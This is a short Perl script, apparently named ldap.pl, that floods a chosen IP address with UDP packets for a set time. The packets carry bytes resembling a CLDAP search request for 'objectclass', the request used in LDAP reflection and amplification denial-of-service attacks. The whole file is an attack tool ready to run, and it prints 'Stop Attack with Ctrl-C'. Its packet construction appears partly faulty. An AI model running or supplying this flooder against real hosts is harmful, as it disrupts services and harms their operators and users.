use Socket;
use strict;
 
if ($#ARGV != 3) {
  print "perl ldap.pl <IP> <PORT> <PSIZE> <SECONDS>\n\n";
  exit(1);
}
 
my ($ip,$port,$size,$time) = @ARGV;
 
my ($iaddr,$endtime,$psize,$pport);
 
$iaddr = inet_aton("$ip") or die "Invalid Target : $ip\n";
$endtime = time() + ($time ? $time : 9999999);
 
socket(flood, PF_INET, SOCK_DGRAM, 17);

print "Stop Attack with Ctrl-C\n" unless $time;
 
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;
 
  send(flood, 
pack("a$psize","\x30\x25\x02\x01\x01\x63\x20\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00", "\x02\x01\x00\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x63\x6c\x61\x73", "\x73\x30\x00"), 
0, pack_sockaddr_in($pport, $iaddr));}
